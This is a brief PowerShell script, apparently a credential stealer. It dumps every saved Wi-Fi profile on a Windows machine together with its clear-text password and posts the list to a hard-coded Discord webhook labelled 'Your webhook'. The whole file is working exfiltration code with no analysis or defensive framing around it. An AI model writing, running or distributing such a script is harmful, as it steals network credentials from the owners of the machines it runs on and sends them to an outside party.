$w='https://discord.com/api/webhooks/1394505472526258246/ebofxtMfwPKP3TLbzMlG03KGVA8gobwRNgmke02ASbtQTHQLl0cGzKLq6W4u2itfCqHS';  # Your webhook
$profiles=(netsh wlan show profiles) -match 'All User Profile\s*:\s*(.+)';
$wifiList=@();
foreach($p in $profiles){
    $name=$p -replace '.*:\s*','';
    $result=netsh wlan show profile name="$name" key=clear;
    $pass=$result | Select-String 'Key Content' | ForEach-Object {($_ -split ':')[1].Trim()};
    if($pass){$wifiList+= "$name : $pass"}
}
$body=@{content=$wifiList -join "`n"} | ConvertTo-Json;
$headers=@{'Content-Type'='application/json'};
if($wifiList.Count -gt 0){
    Invoke-RestMethod -Uri $w -Method Post -Headers $headers -Body $body
}
